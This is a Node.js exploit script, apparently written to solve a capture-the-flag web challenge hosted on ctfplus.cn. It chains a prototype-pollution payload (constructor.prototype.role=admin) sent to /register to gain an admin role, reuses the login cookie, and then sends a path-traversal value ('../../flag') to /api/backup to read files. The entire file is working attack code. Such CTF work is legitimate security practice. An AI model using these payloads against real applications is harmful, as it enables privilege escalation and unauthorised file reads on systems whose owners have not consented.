
const http = require('http');
const querystring = require('querystring');

// Correct nested format for qs: constructor.prototype.role=admin
const postData = querystring.stringify({
  "username": "hacktest",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log(body);
    // Extract UID
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log("\nGot UID:", uid);
      // Login and check
      loginAndCheck(uid);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndCheck(uid) {
  const http = require('http');
  const querystring = require('querystring');

  const postData = querystring.stringify({
    "uid": uid
  });

  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let setCookie = res.headers['set-cookie'];
    let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
    getPage('/dashboard', cookie, (body) => {
      console.log("\nDashboard:");
      console.log(body);
      // Check if role is admin
      if (body.includes('tag.admin')) {
        console.log("\nGot admin role! Looking for backup...");
        // Try /backup GET and POST
        getPage('/backup', cookie, (backupBody) => {
          if (!backupBody.includes('404') && !backupBody.includes('Access Denied')) {
            console.log("\nBackup result:");
            console.log(backupBody);
          } else {
            // Try POST to /api/backup
            postBackup(cookie);
          }
        });
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}

function postBackup(cookie) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Cookie': cookie,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(querystring.stringify({file: '../../flag'}))
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nPOST /api/backup response:");
      console.log(body);
    });
  });
  req.write(querystring.stringify({file: '../../flag'}));
  req.end();
}
